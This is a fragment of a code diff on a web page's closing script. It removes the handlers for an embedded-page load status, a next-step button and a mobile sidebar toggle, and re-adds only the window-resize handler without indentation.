-    embedFrame.addEventListener('load', () => {
-      clearTimeout(embedCheckTimer);
-      embedStatus.textContent = 'Embedded page loaded. If the page appears blank or refuses to connect, use the direct link button below.';
-      showFallback('If the website refuses to connect or redirects out of the frame, open it directly.');
-    });
-
-    nextBtn.addEventListener('click', () => {
-      stepOneView.classList.remove('active');
-      stepTwoView.classList.add('active');
-      setActiveStep(2);
-      loadEmbed();
-      stepTwoView.scrollIntoView({ behavior: 'smooth', block: 'start' });
-    });
-
-    mobileToggle.addEventListener('click', () => {
-      const isOpen = sidebar.classList.contains('open');
-      if (isOpen) {
-        closeSidebar();
-      } else {
-        openSidebar();
-      }
-    });
-
-    sidebarBackdrop.addEventListener('click', closeSidebar);
-
-    window.addEventListener('resize', () => {
-      if (window.innerWidth > 980) {
-        closeSidebar();
-      }
-    });
-  </script>
+window.addEventListener('resize', () => {
+if (window.innerWidth > 980) {
+closeSidebar();
+}
+});
+</script>
 </body>
 </html>
